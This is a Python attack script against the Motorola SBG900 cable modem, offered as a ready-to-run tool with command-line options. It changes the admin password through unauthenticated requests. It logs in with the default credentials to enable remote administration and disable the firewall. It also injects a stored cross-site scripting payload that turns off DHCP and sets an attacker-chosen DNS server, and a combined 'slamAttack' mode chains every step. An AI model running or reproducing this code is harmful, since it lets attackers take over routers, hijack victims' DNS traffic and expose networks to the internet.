import requests
import argparse

# Motorola SBG900 change admin password
def changePasswd(ip, newPass):
    try:
        s = requests.session()
        s.get("http://"+ip+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+newPass+"&Gateway.BasicAdminSetting.verifyPassword="+newPass+"&Gateway.BasicAdminSetting.set=1")
        s.get("http://"+ip+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+newPass+"&Gateway.BasicAdminSetting.newPassword="+newPass+"&Gateway.BasicAdminSetting.verifyPassword="+newPass+"&Gateway.BasicAdminSetting.set=1")
    except Exception as e:
        print("[Python Socket Connection Closed]" + str(e))
    
    print("Connection Closed. Check the webserver for password change.")

# Motorola SBG900 enable remote access
def remoteAccess(ip):
    try:
       s = requests.session()
       s.get("http://"+ip+"/frames.asp?userId=admin&password=motorola") #auth
       s.get("http://"+ip+"/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1")
    except Exception as e:
        print("[Python Socket Connection Closed]" + str(e))
    print("Enabled Remote Access.")

# Motorola SBG900 turn off firewall
def disableFirewall(ip):
    try:
        s = requests.session()
        s.get("http://"+ip+"/frames.asp?userId=admin&password=motorola") #auth
        s.get("http://"+ip+"/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4")
    except Exception as e:
        print("[Python Socket Connection Closed]" + str(e))
    print("Disabled Firewall.")

# Motorola SBG900 disable DHCP and add custom DNS server
def disableDHCPAddDNSServer(ip, dns):
    try:
        s = requests.session()
        s.get("http://"+ip+"/frames.asp?userId=admin&password=motorola") #auth
        s.get('http://'+ip+'/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+dns+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27')
    except Exception as e:
        print("[Python Socket connection Closed]" + str(e))
    print("DHCP Disabled, New DNS added.");

# Use all the exploits known.
def slamAttack(ip, newPass, dns):
    print("Running Web Attacks: \n Password will be change, a new DNS server will be added, DHCP will be diabled, and the device web interface will be open to the internet.")
    changePasswd(ip, newPass)
    remoteAccess(ip)
    disableDHCPAddDNSServer(ip, dns)
    disableFirewall(ip)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-cp", "--chgPass", help="Change Modem admin password. You will need to specify", action='store_true', default=False)
    parser.add_argument("-ra","--remoteAccess", help="Enable remote access on the modem", action='store_true', default=False)
    parser.add_argument("-dd","--disableDHCPaddDNS", help="Motorola SBG900 disable DHCP and add custom DNS server", action='store_true', default=False)
    parser.add_argument("-df","--disableFirewall", help="Motorola SBG900 turn off firewall", action='store_true', default=False)
    parser.add_argument("-sa","--slamAttack", help="Use all exploits", action='store_true', default=False)
    parser.add_argument("-p","--newPass", help="Enter new Password", default=None)
    parser.add_argument("-d","--device", help="Enter IP address default 192.168.100.1", default="192.168.100.1")
    parser.add_argument("-D","--dns", help="Change DNS server", default=None)
    args = parser.parse_args()
    try:
        if args.chgPass is True:
            if args.newPass is not None:
                changePasswd(args.device, args.newPass)    
            else:
                raise Exception("You need to enter the new password!")
        elif args.remoteAccess is True:
            remoteAccess(args.device)
        elif args.disableDHCPaddDNS is True:
            if args.dns is not None:
                disableDHCPAddDNSServer(args.device, args.dns)
            else:
                raise Exception("You need to specify an DNS server to add to the device.")
        elif args.disableFirewall is True:
            disableFirewall(args.device)
        elif args.slamAttack is True:
            if args.newPass is None or args.dns is None:
                raise Exception("Please enter a password and dns server to change on the device.")
            else:
                slamAttack(args.device, args.newPass, args.dns)
        else:
            print("This script didnt run correctly, please use --help to read more.")
    except Exception as inst:
        print("[Error]" + str(inst))

if __name__ == "__main__":
    main()
